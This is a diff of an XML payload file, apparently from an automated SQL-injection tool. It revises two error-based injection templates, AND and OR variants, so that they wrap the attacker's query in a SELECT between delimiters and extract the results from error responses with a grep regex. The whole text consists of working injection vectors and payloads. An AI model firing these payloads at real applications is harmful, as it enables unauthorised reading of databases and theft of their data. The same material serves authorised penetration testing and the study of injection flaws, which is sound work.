@@ -394,9 +394,9 @@
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
-        <vector>AND [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <vector>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>AND [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -415,9 +415,9 @@
         <risk>3</risk>
         <clause>1,9</clause>
         <where>2</where>
-        <vector>OR [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <vector>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>OR [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
